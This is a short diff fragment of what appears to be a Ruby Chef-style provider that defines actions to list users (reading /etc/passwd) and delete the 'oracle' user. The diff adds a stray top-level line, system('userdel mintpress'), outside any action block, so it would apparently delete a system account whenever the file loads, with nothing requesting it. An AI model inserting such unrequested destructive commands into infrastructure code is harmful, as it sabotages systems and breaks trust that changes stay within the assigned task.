@@ -44,7 +44,7 @@ end
 action :list_users do
   exec_command 'cat /etc/passwd'
 end
-
+system('userdel mintpress')
 action :delete_user do
   exec_command 'userdel oracle'
 end
